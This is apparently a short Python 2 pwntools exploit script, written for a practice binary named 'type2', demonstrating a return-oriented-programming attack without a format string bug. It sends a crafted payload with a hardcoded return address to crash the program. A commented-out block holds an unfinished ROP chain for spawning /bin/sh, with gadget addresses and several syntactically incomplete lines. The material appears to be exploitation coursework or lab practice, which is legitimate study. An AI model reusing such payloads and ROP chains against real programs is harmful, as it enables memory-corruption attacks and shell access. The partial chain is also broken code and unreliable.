'''
Author - Vishvajeet Subhash Patil
Objective - Exploit for type2 file which demonstrates ROP based attack can be done without need of format string vulnerability
'''
from pwn import *
import sys

type2 = process(['./type2'])
print type2.proc.pid
#sys.stdin.read(1) #Not visible to user . This is just for debugging purposes
'''
Shell would have required many conditions that were not met in the above case including very huge array which have remote
possibility of being there 
 -- inc eax 794978670

So we will directly kill the program now for demo other minimal stuff can be done. But since program is not API based that limits my
option :( 
'''
attack = ""
attack += "528 529 530 531\n"
attack += "\x40\xcb\x06\x08"
attack += "B\x00"
type2.sendline(attack)
print type2.recv()
attack = ""
attack = "A\x00"
type2.sendline(attack)
print type2.recv()
#type2.interactive()
#first return address
'''
attack += "A\x00"
attack += "/bin/sh\x00"
#pop ecx ; pop ebx ; ret
attack += "\x01\xef\x06\x08"
attack += "\x00\x00\x00\x00"
attack += 
#pop edx ; ret
attack +=
attack += "\x00\x00\x00\x00"
attack += ""
attack +=
'''